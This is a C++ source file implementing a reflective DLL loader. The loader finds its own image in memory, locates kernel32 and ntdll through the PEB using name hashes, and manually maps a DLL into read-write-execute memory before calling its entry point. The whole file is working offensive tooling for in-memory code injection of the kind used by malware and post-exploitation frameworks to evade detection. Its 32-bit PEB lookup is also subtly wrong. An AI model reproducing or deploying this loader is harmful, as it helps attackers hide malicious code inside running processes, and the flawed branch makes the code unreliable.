#include "reflective.hpp"

HINSTANCE hAppInstance = nullptr;

using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

// This function is invoked by DLL Loader with Reflective DLL Injection technique.
DLLEXPORT BOOL ReflectiveDllLoader(LPVOID lpParameter)
{   
    // Brute force DLL base address
    ULONG_PTR uLibAddr = (ULONG_PTR)ReflectiveCaller();
    // ULONG_PTR uLibAddr = (ULONG_PTR)ReflectiveDllLoader;

    LOADLIBRARYA pLoadLibraryA     = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc     = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    ULONG_PTR uBaseAddr;
    ULONG_PTR uExportDir;
    ULONG_PTR uNames;
    ULONG_PTR uNameOrdinals;
    ULONG_PTR uAddresses;
    DWORD dwHashValue;

    ULONG_PTR uHeaderValue;
    ULONG_PTR uValueA;
	ULONG_PTR uValueB;
	ULONG_PTR uValueC;
	ULONG_PTR uValueD;
	ULONG_PTR uValueE;

    USHORT uCounter;

    while (TRUE)
    {
        if (((PIMAGE_DOS_HEADER)uLibAddr)->e_magic == IMAGE_DOS_SIGNATURE)
        {
            uHeaderValue = ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;

            if (sizeof(IMAGE_DOS_HEADER) <= uHeaderValue && uHeaderValue < 1024)
            {
                uHeaderValue += uLibAddr;
                if (((PIMAGE_NT_HEADERS)uHeaderValue)->Signature == IMAGE_NT_SIGNATURE)
                    break;
            }
        }
        uLibAddr--;
    }

    // Get pointer to PEB
    #ifdef _WIN64
        uBaseAddr = __readgsqword(0x60);
    #else
        uBaseAddr = __readgsqword(0x30);
    #endif

    uBaseAddr = (ULONG_PTR)((PPEB)uBaseAddr)->Ldr;

    uValueA = (ULONG_PTR)((PPEB_LDR_DATA)uBaseAddr)->InMemoryOrderModuleList.Flink;
    while (uValueA)
    {
        uValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->BaseDllName.Buffer;
        uCounter = ((PLDR_DATA_TABLE_ENTRY_R)uValueA)->BaseDllName.Length;
        uValueC = 0;

        do
        {
            uValueC = rotate((DWORD)uValueC);
            if (*((BYTE*)uValueB) >= 'a')
                uValueC += *((BYTE*)uValueB) - 0x20;
            else
                uValueC += *((BYTE*)uValueB);
            uValueB++;
        } while (--uCounter);

        // Compare the hash with the that of kernel32.dll
        if ((DWORD)uValueC == HASH_KERNEL32DLL)
        {
            // get this modules base address
			uBaseAddr = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->DllBase;

			// get the VA of the modules NT Header
			uExportDir = uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the VA of the export directory
			uExportDir = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);

			// get the VA for the array of name pointers
			uNames = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNames);
			
			// get the VA for the array of name ordinals
			uNameOrdinals = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNameOrdinals);

			uCounter = 3;

            // Loop while we still have imports to find
            while (uCounter > 0)
            {
                // compute the hash values for this function name
				dwHashValue = hash((char*)(uBaseAddr + DEREF_32(uNames)));
				
				// if we have found a function we want we get its virtual address
				if(
                    dwHashValue == HASH_LOADLIBRARYA ||
                    dwHashValue == HASH_GETPROCADDRESS ||
                    dwHashValue == HASH_VIRTUALALLOC
                ) {
					// get the VA for the array of addresses
					uAddresses = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));

					// store this functions VA
					if(dwHashValue == HASH_LOADLIBRARYA)
						pLoadLibraryA = (LOADLIBRARYA)(uBaseAddr + DEREF_32(uAddresses));
					else if(dwHashValue == HASH_GETPROCADDRESS)
						pGetProcAddress = (GETPROCADDRESS)(uBaseAddr + DEREF_32(uAddresses));
					else if(dwHashValue == HASH_VIRTUALALLOC )
						pVirtualAlloc = (VIRTUALALLOC)(uBaseAddr + DEREF_32(uAddresses));
			
					// decrement our counter
					uCounter--;
				}

				// get the next exported function name
				uNames += sizeof(DWORD);
				// get the next exported function name ordinal
				uNameOrdinals += sizeof(WORD);
            }
        }
        else if ((DWORD)uValueC == HASH_NTDLLDLL)
        {
            // get this modules base address
			uBaseAddr = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->DllBase;

			// get the VA of the modules NT Header
			uExportDir = uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the VA of the export directory
			uExportDir = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);

			// get the VA for the array of name pointers
			uNames = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNames);
			
			// get the VA for the array of name ordinals
			uNameOrdinals = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNameOrdinals);

			uCounter = 1;

            // loop while we still have imports to find
			while(uCounter > 0)
			{
				// compute the hash values for this function name
				dwHashValue = hash((char*)(uBaseAddr + DEREF_32(uNames)));
				
				// if we have found a function we want we get its virtual address
				if(dwHashValue == HASH_NTFLUSHINSTRUCTIONCACHE)
				{
					// get the VA for the array of addresses
					uAddresses = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));

					// store this functions VA
					if(dwHashValue == HASH_NTFLUSHINSTRUCTIONCACHE)
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uBaseAddr + DEREF_32(uAddresses));

					// decrement our counter
					uCounter--;
				}

				// get the next exported function name
				uNames += sizeof(DWORD);
				// get the next exported function name ordinal
				uNameOrdinals += sizeof(WORD);
			}
        }

        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
            break;

        uValueA = DEREF(uValueA);
    }

    // get the VA of the NT Header for the PE to be loaded
	uHeaderValue = uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uBaseAddr = (ULONG_PTR)pVirtualAlloc(
        NULL,
        ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

	// we must now copy over the headers
	uValueA = ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.SizeOfHeaders;
	uValueB = uLibAddr;
	uValueC = uBaseAddr;

	while(uValueA--)
		*(BYTE*)uValueC++ = *(BYTE*)uValueB++;

	// uiValueA = the VA of the first section
	uValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uHeaderValue)->FileHeader.SizeOfOptionalHeader);

    // itterate through all sections, loading them into memory.
	uValueE = ((PIMAGE_NT_HEADERS)uHeaderValue)->FileHeader.NumberOfSections;
	while(uValueE--)
	{
		// uiValueB is the VA for this section
		uValueB = (uBaseAddr + ((PIMAGE_SECTION_HEADER)uValueA)->VirtualAddress);

		// uiValueC if the VA for this sections data
		uValueC = (uLibAddr + ((PIMAGE_SECTION_HEADER)uValueA)->PointerToRawData );

		// copy the section over
		uValueD = ((PIMAGE_SECTION_HEADER)uValueA)->SizeOfRawData;

		while(uValueD--)
			*(BYTE*)uValueB++ = *(BYTE*)uValueC++;

		// get the VA of the next section
		uValueA += sizeof(IMAGE_SECTION_HEADER);
	}
	
    // uiValueB = the address of the import directory
	uValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	
	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uValueC = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uValueB)->VirtualAddress);

    while(((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->Name)
    {
        // use LoadLibraryA to load the imported module into memory
		uLibAddr = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		uValueD = (uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->OriginalFirstThunk);
	
		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uValueA = (uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->FirstThunk);

        // itterate through all imported functions, importing by ordinal if no name present
		while(DEREF(uValueA))
        {
            // sanity check uiValueD as some compilers only import by FirstThunk
			if(uValueD && ((PIMAGE_THUNK_DATA)uValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// get the VA of the modules NT Header
				uExportDir = uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				uExportDir = (uLibAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);

				// get the VA for the array of addresses
				uAddresses = (uLibAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uAddresses += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY )uExportDir)->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uValueA) = (uLibAddr + DEREF_32(uAddresses));
			}
            else
			{
				// get the VA of this functions import by name struct
				uValueB = (uBaseAddr + DEREF(uValueA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uLibAddr, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uValueB)->Name);
			}
            // get the next imported function
			uValueA += sizeof(ULONG_PTR);
			if(uValueD)
				uValueD += sizeof(ULONG_PTR);
        }
        // get the next import
		uValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }

    // calculate the base address delta and perform relocations (even if we load at desired image base)
	uLibAddr = uBaseAddr - ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // check if their are any relocations present
	if(((PIMAGE_DATA_DIRECTORY)uValueB)->Size)
    {
        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uValueC = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uValueB)->VirtualAddress);

        // and we itterate through all entries...
		while(((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock)
        {
            // uiValueA = the VA for this relocation block
			uValueA = (uBaseAddr + ((PIMAGE_BASE_RELOCATION)uValueC)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			uValueB = (((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			uValueD = uValueC + sizeof(IMAGE_BASE_RELOCATION);

            // we itterate through all the entries in the current block...
			while(uValueB--)
            {
                if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_DIR64)
                {
					*(ULONG_PTR*)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += uLibAddr;
                }
				else if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_HIGHLOW)
                {
					*(DWORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += (DWORD)uLibAddr;
                }
                else if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_HIGH)
                {
					*(WORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += HIWORD(uLibAddr);
                }
				else if( ((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_LOW)
                {
					*(WORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += LOWORD(uLibAddr);
                }

				// get the next entry in the current relocation block
				uValueD += sizeof(IMAGE_RELOC);
            }

            // get the next entry in the relocation directory
			uValueC = uValueC + ((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock;
        }
    }

    // uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uValueA = (uBaseAddr + ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.AddressOfEntryPoint);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

    ((DLLMAIN)uValueA)((HINSTANCE)uBaseAddr, DLL_PROCESS_ATTACH, NULL);

    return uValueA;
}